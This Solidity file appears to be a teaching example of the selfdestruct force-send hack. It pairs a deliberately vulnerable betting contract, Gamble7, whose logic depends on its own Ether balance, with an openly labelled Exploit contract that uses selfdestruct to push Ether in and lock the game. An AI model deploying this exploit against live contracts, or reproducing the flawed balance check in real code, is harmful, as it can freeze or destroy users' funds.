// SPDX-License-Identifier: GPL-3.0
// Source of Inspiration: https://solidity-by-example.org/0.6/hacks/self-destruct/
pragma solidity ^0.7.0;

contract Gamble7 {
    uint public target = 7 ether;
    address public winner;
    
    // deposits 1 ether worth of ether in the contract balance
    function deposit() public payable {
        require(msg.value == 1 ether, "You have to spend exactly 1 ether!");
        
        /*
        "this refers to the instance of the contract where the call is made 
        (you can have multiple instances of the same contract).
        
        - address(this) refers to the address of the instance of the contract where the call is being made.
        - msg.sender refers to the address where the contract is being called from.
        
        Therefore, address(this) and msg.sender are two unique addresses, 
        the first referring to the address of the contract instance 
        and the second referring to the address where the contract call originated from.""

        -brianbshu, from: https://ethereum.stackexchange.com/questions/40018/what-is-addressthis-in-solidity
        */
        uint balance = address(this).balance;
        require(balance <= target, "The Game is Over");
        
        if(balance == target) winner = msg.sender;
    }
 
    function claimReward() public {
        require(msg.sender == winner, "You are not the winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Exploit{
    Gamble7 gamble;
    
    constructor(Gamble7 _gamble) {
        gamble = Gamble7(_gamble);
    }
 
    function attack() public payable {
        // cast address to payable
        address payable addr = payable(address(gamble));
        
        /*
        "The only possibility that code is removed from the blockchain 
        is when a contract at that address performs the selfdestruct operation.
        The remaining Ether stored at that address is sent to a designated target
        and then the storage and code is removed from the state.""
        
        Source: 
        https://docs.soliditylang.org/en/v0.4.21/introduction-to-smart-contracts.html
        
        =======================================================================

        Selfdestructs in Ethereum are an operation (an OPCODE actually) 
        at the EVM level, independent of what language or client you are using.
        For example, calling selfdestruct(address) sends 
        all of the contract's current balance to address.
        This is useful when you are finished with a contract, 
        because it costs far less gas than just sending the balance 
        with address.send(this.balance).
        In fact, the SELFDESTRUCT opcode uses negative gas
        because the operation frees up space on the blockchain 
        by clearing all of the contract's data.
        This negative gas deducts from the total gas cost of the transaction, 
        so if you're doing some clean-up operations first, 
        SELFDESTRUCT can reduce your gas costs.

        Source: 
        https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming
        */
        selfdestruct(addr);
    }
}
